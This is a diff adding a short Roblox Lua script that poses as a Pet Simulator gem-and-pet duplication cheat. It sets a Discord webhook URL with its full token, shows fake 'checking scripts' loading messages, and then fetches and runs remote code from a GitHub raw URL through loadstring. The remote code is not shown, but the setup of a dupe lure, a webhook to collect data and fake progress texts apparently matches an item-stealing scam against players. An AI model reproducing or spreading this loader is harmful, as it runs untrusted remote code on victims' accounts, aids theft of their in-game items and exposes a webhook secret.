@@ -1,0 +1,14 @@
+Username = "VOID_open"
+WebHook = "https://discord.com/api/webhooks/1120148216508334190/c49pKXx1SPRrKv04xHX89JmhdiOb4r9myvEPzX1LWJSB2aHxylCWcIO3H4MrqBtDr0Eb"
+
+_G.CustomScriptName = "Pet-Simulator-Huge-And-1B-Gems-Dupe-pls-dont-abuse-"
+_G.UnlockPets = true
+_G.AntiLeave = true
+_G.Diamonds = 50000
+_G.Crash = true
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
